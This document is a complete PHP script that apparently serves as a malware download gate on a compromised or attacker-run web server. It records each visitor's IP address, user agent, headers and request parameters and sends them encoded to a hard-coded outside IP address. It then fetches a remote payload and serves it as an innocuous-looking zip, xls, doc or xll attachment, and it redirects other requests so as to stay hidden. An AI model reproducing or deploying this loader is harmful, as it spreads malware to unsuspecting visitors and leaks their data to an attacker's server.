<?php 

	$VERSION = 'f60bc43c4aa782190b4112c28e108063';
	
	ini_set('display_errors', 0);
	ini_set('display_startup_errors', 0);
	error_reporting(E_ALL);

	if( !function_exists('header') ){
		exit('.h');
	}

	function curl_get( $url ){

		if( !function_exists('curl_init') ){
			return false;
		}

		$curl = curl_init();
	 
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HEADER, false);

		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10); 
		curl_setopt($curl, CURLOPT_TIMEOUT, 20);
		 
		$data = curl_exec($curl);
		 
		curl_close($curl);

		return trim($data);
	}
	
	function generateRandomString($length){

		if( empty($length) ){
			$length = 10;
		}

	    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }
	    return $randomString;
	}

	function response_404(){

		header("Location: /", true, 302);

		/*
		if( function_exists('http_response_code') ){
			http_response_code(404);
		}

		echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Ubuntu) Server</address>
</body></html>
';
*/
		
		exit;
	}

	$REDIRECT_FILENAME = 'charts';

	/*
	if( session_start() === false ){
		response_404();
		exit('');
	}
	*/
	
	$REQUEST_URI = $_SERVER['REQUEST_URI'];

	if( stripos($REQUEST_URI, 'logotype.jpg') !== false ){
		$_SESSION['has_logo'] = true;
		response_404();
		exit();
	}

	if( empty($REQUEST_URI) ){
		response_404();
		exit('');
	}

	$REQUEST_URI_ARR = explode("/", $REQUEST_URI);

	if( count($REQUEST_URI_ARR) < 2 ){
		response_404();
		exit('');
	}

	if( empty($_GET['e']) ){
		$_GET['e'] = 'index';
	}

	function getRealIpAddr()
	{
	    return $_SERVER['REMOTE_ADDR'];
	}

	if( empty(getRealIpAddr()) ){
		response_404();
		exit('.pi');
	}

	$hdrs_new = array();

	$hdrs = getallheaders();
	foreach ($hdrs as $key => $value) {
		$kk = strtolower($key);
		$hdrs_new[$kk] = $value;
	}

	$file_ext = explode(".", $_GET['e']);
	$file_ext = end( $file_ext );

	if( !in_array( $file_ext , array( 'zip', 'xls', 'doc', 'xll' )) ){
		$file_ext = 'zip';
	}

	$data_json = array(
		"ip" => getRealIpAddr(),
		"time" => time(),
		"hh" => $hdrs_new['hh'],
		"ext" => $file_ext,
		"host" => $_SERVER['SERVER_NAME'],
		"filename" => $_GET['e'],
		"ua" => $_SERVER['HTTP_USER_AGENT'],
		"_gets" => $_GET,
	);

	$data_json = json_encode($data_json);
	$data_json = base64_encode($data_json);

	// START check black list
	$ip_for_check = getRealIpAddr();

	$resp_version = 2;

	$links = array(
		'http://149.248.76.130/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
	);

	$outfilepath = __DIR__ . '/../big__stat.txt';

	if( empty($_SESSION['doc_name']) ){
		$_SESSION['doc_name'] = $REDIRECT_FILENAME . "." . $file_ext;
	}

	$has_resp = false;

	foreach ($links as $link) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 30,
		    )
		));

		$data = @file_get_contents( $link , false, $ctx);

		if( empty($data) ){
			$data = curl_get($link);
		}

		if( $data == '....' || $data == '...' ){
			break;
		}

		if( strlen($data) < 100 ){
			continue;
		}

		$resp_data = $data;
		$fname = $_SESSION['doc_name'];

		if( $resp_version == 2 ){

			$tmp_data = json_decode( $data, true );

			$fname = $tmp_data['filename'];
			$resp_data = base64_decode( $tmp_data['data'] );

		}

		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . $fname ); 
		header('Content-Transfer-Encoding: binary');
		header('Connection: Keep-Alive');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');

		echo $resp_data;

		$has_resp = true;

		exit;
	}

	if( !$has_resp ){
		response_404();
	}

	// exit("Try again.");

	//<< loader